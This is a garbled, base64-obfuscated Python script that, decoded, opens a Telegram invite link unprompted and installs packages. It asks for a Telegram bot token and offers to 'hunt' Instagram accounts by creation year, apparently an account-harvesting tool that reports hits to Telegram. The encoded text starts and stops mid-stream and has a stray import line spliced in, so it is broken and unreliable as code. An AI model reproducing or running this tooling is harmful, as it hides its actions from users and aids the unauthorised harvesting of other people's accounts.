YW594pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbCiIiIikKU1RFSU5import os,sys,base64 as BcHJpbnQoIkVOQ09ERUQgQlkgQHozdXN4ICIpCmltcG9ydCB3ZWJicm93c2VyCndlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly90Lm1lLytVeTllSnBxa1R5aGxaR1JsIikKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IFN0eWxlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpCT0xEPVN0eWxlLkJSSUdIVApSRVNFVD1TdHlsZS5SRVNFVF9BTEwKUkVTRVQ9IlwwMzNbMG0iCllFTExPVz0iXDAzM1sxbVwwMzNbMzNtIgpHUkVFTj0iXDAzM1sxbVwwMzNbMzJtIgpSRUQ9IlwwMzNbMW1cMDMzWzMxbSIKQ1lBTj0iXDAzM1sxbVwwMzNbMzZtIgpXSElURT0iXDAzM1sxbVwwMzNbMzdtIgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQganNvbiwgc3RyaW5nCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKaW1wb3J0IG9zCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgKgpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHBwCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudCBhcyBnZ2IKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjYwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZHJhbmdlIGFzIHJyCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXVpZApmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKaW1wb3J0IHN5cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQp0cnk6Cglmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdApleGNlcHQ6Cglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGNvbG9yYW1hJykKCWZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CnRyeToKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHB5dGhvbi1jZm9udHMnKQogICAgZnJvbSBjZm9udHMgaW1wb3J0IHJlbmRlciwgc2F5CmltcG9ydCB0aW1lCmluaXQoYXV0b3Jlc2V0PVRydWUpCnJlZCA9ICJcMDMzWzFtXDAzM1szMW0iCmdyZWVuID0gIlwwMzNbMW1cMDMzWzMybSIKeWVsbG93ID0gIlwwMzNbMW1cMDMzWzMzbSIKYmx1ZSA9ICJcMDMzWzFtXDAzM1szNG0iCmN5YW4gPSAiXDAzM1sxbVwwMzNbMzZtIgptYWdlbnRhID0gIlwwMzNbMW1cMDMzWzM1bSIKTSA9ICJcMDMzWzFtXDAzM1szNm0iCndoaXRlID0gIlwwMzNbMW1cMDMzWzM3bSIKb3JhbmdlID0gIlwwMzNbMW1cMDMzWzM4OzU7MjA4bSIKcmVzZXQgPSAiXDAzM1swbSIKR09KTyA9IHJlbmRlcigne01FVEF9JywgY29sb3JzPVsnd2hpdGUnLCAnYmx1ZSddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJ1xuCiAgSk9JTiBURUFNIFBSSU1FIFRPIFJVTiBUSElTIFRPT0wKICAgICAgICAnJycpCnByaW50KGYnXHgxYlsxOzM5beKUgScqNjApCklEID0gaW5wdXQoJ0VudGVyIFlvdXIgQ2hhdCBJZCAtPiAgJykKRklMRU5BTUUgPSAnTUVUQScKdG9rZW4gPSBpbnB1dCgnRW50ZXIgWW91ciBUZWxlZ3JhbSBCb3QgVG9rZW4gLT4gICcpCmFjYSA9IDAKdG90YWwgPSAwCmhpdHMgPSAwCmJhZGluc3RhID0gMApiYWRlbWFpbCA9IDAKZ29vZGlnID0gMAppbmZvaW5zdGEgPSB7fQoKZGVmIHBwcHAoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgb3V0cHV0ID0gKGYiIFtUcnVlXSA6IHtoaXRzfVxuIgogICAgICAgICAgICAgIGYiIFtHZW5dIDoge2JhZGluc3RhfVxuIgogICAgICAgICAgICAgIGYiIFtGYWxzZV0gOiB7YmFkZW1haWx9XG4iCiAgICAgICAgICAgICAgZiIgW0JhZF0gOiB7Z29vZGlnfVxuIikKICAgIHN5cy5zdGRvdXQud3JpdGUob3V0cHV0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgphID0gcHJpbnQoZiIiIgp7Y3lhbn3ilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMKe2N5YW594pSDIHtibHVlfS0+IHt3aGl0ZX1TZWxlY3QgVGhlIFllYXIgWW91IFdhbnQgVG8gSHVudCBGb3Ige2JsdWV9LT4ge2N5YW59IOKUgwp7Y3lhbn3ilIPilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MXt3aGl0ZX0gLSB7eWVsbG93fTIwMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Mnt3aGl0ZX0gLSB7eWVsbG93fTIwMTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9M3t3aGl0ZX0gLSB7eWVsbG93fTIwMTMgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NHt3aGl0ZX0gLSB7eWVsbG93fTIwMTQgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NXt3aGl0ZX0gLSB7eWVsbG93fTIwMTUgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Nnt3aGl0ZX0gLSB7eWVsbG93fTIwMTYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9N3t3aGl0ZX0gLSB7eWVsbG93fTIwMTcgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OHt3aGl0ZX0gLSB7eWVsbG93fTIwMTggICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OXt3aGl0ZX0gLSB7eWVsbG93fTIwMTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MHt3aGl0ZX0gLSB7eWVsbG93fTIwMTEge3doaXRlfX4ge3llbGxvd30yMDIzICAgICAgICAgICAgICAgICAge2N5YW59ICAgICAgICDilIMKe2N5YW594pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbCiIiIikKU1RFSU5'
